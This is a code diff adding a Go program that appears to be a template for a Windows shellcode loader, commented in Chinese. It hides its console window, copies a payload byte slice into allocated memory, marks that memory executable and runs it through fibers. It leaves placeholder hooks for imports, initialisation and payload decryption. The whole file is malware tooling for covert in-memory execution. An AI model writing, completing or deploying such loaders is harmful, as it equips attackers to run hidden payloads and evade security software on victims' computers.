@@ -1,0 +1,61 @@
+package main
+
+import (
+	"github.com/gonutz/ide/w32"
+	"golang.org/x/sys/windows"
+	"unsafe"
+	//__import__
+)
+
+const (
+	MemCommit       = 0x1000
+	MemReserve      = 0x2000
+	PageReadwrite   = 0x04
+	PageExecuteRead = 0x20
+
+)
+
+
+func closeWindows(commandShow uintptr) {
+	console := w32.GetConsoleWindow()
+	if console != 0 {
+		_, consoleProcID := w32.GetWindowThreadProcessId(console)
+		if w32.GetCurrentProcessId() == consoleProcID {
+			w32.ShowWindowAsync(console, commandShow)
+		}
+	}
+}
+
+// 解密函数
+func f() {}
+
+func main() {
+	// shellcode
+	closeWindows(w32.SW_HIDE)
+	//__init__
+	// 加载核心dll文件
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+
+	// 加载需要用到的函数
+	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect := kernel32.NewProc("VirtualProtect")
+	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
+	CreateFiber := kernel32.NewProc("CreateFiber")
+	SwitchToFiber := kernel32.NewProc("SwitchToFiber")
+	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
+	// 调用ConvertThreadToFiber函数
+	fiberAddr, _, _ := ConvertThreadToFiber.Call()
+	// 申请一块可读可写的虚拟机内存
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), MemCommit|MemReserve, PageReadwrite)
+	// copy shellcode到内存
+	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
+	// 可读写内存
+	oldProtect := PageReadwrite
+	// 设置内存属性为 可执行
+	_, _, _ = VirtualProtect.Call(addr, uintptr(len(byteSlice)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
+	// 调用 CreateFiber 函数
+	fiber, _, _ := CreateFiber.Call(0, addr, 0)
+	_, _, _ = SwitchToFiber.Call(fiber)
+	_, _, _ = SwitchToFiber.Call(fiberAddr)
+}
